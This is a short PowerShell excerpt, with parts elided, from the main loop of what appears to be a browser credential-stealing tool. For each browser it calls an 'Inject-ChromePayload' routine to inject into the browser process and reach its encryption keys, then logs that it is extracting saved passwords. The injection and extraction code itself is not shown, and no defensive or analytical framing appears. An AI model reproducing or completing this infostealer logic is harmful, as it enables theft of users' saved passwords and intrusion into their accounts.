...
function Main {
    ...
    foreach ($browserName in $BROWSERS.Keys) {
        ...
        # Attempt process injection to access encryption keys directly
        Log-Output "[*] Attempting process injection for direct encryption key access..."
        $injectionSuccess = Inject-ChromePayload -BrowserName $browserName -BrowserPath $config.bin
        ...
        # Extract saved passwords (with injection assistance if successful)
        Log-Output "[*] Extracting saved passwords..."
        if ($injectionSuccess) {
            Log-Output "[+] Using injected process for direct key access"
        }
